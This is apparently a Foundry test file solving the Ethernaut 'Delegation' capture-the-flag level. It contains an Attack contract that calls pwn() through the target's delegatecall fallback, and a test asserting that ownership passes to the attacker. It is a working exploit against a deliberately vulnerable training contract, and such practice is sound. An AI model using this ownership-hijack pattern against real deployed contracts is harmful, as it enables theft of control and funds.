// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/06_Delegation.sol";

contract DelegationTest is Test {
    Delegation instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);
        Delegate instance0 = new Delegate(vm.addr(2));
        instance = new Delegation(address(instance0));
        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        vm.startPrank(player1);
        attacker.attack();
        assertEq(instance.owner(), address(attacker));
        vm.stopPrank();
    }
}

contract Attack {
    Delegation instance;

    constructor(address fb) {
        instance = Delegation(fb);
    }

    function attack() public {
        (bool success, ) = address(instance).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "call not successful");
    }
}
